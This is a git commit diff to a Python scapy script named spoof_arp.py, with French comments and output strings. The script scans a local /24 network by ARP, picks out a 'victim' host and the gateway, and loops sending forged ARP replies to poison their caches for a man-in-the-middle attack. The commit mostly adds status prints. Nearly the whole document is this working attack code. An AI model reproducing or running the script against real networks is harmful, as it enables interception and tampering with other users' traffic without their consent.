d33ddbdd5a49498f7d54d427168c6df8881bc012
unknown <alan.waret24@gmail.com>
2022-11-13 01:33:44 +0100

    Arp Spoof 2

--- spoof_arp.py
+++ spoof_arp.py
@@ -6,18 +6,23 @@ def ARP_Spoof(IP):
     MAC = [] #Variable de stockage des adresses MAC
     IP = [] #Variable de stockage des adresses IP
 
+    print("[*] Scan en cours [...]") 
+
     scapy.conf.verb = 0 
     ans= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = "192.168.1.0/24"), timeout = 2, inter = 0.1) # Scan ARP pour récupérer les adresses
     
+    print ("\n[*] IP - MAC") 
 
     for i in range(len(ans)): # Stock des adresses MAC et IP
         MAC.append(ans[i][1].hwsrc)
         IP.append(ans[i][1].psrc)
 
-    print("VICTIM : Adress Mac ",MAC[1],", IP  ",IP[1],"GATEWAY : Adress Mac ",MAC[2]," IP ",IP[2])
+    print("\n[*] Scan fini" + "\n[*] Résultat :" + "\n ADRESSES MAC :", MAC + "\n ADRESSES IP :", IP )
+
+    print("[*]VICTIME : Adresse Mac ",MAC[1],", IP  ",IP[1],"\n [*]GATEWAY : Adresse Mac ",MAC[2]," IP ",IP[2])
     
-    def spoof(target_ip, spoof_ip): 
-        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = MAC[1], psrc = spoof_ip)
+    def spoof(ip_1 , ip_2): 
+        packet = scapy.ARP(op = 2, pdst = ip_1, hwdst = MAC[1], psrc = ip_2)
         scapy.send(packet, verbose = False)
 
     while True: # Redistribution des requêtes ARP 
